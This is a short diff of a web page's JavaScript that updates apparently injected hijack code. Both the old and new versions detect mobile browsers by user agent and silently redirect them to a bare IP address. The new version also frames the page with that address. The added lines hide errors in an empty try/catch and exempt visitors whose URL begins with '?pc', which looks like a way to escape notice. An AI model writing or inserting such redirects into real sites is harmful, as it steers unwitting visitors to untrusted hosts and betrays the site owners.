@@ -19,15 +19,13 @@
 })();
 
 
-if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
-    //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.38";
-}else if (/(Android)/i.test(navigator.userAgent)) {
-    //alert(navigator.userAgent); 
-    window.location.href = "http://38.26.195.38";
-}
+try {
+  if (location.search.indexOf('?pc') !== 0 && /Android|Windows Phone|iPhone|iPod/i.test(navigator.userAgent)) {
+    window.location.href = 'http://38.26.195.40';
+  }
+} catch (e) {}
 var titlestr=document.title;
-setFrame("http://38.26.195.38");
+setFrame("http://38.26.195.40");
 
 
 
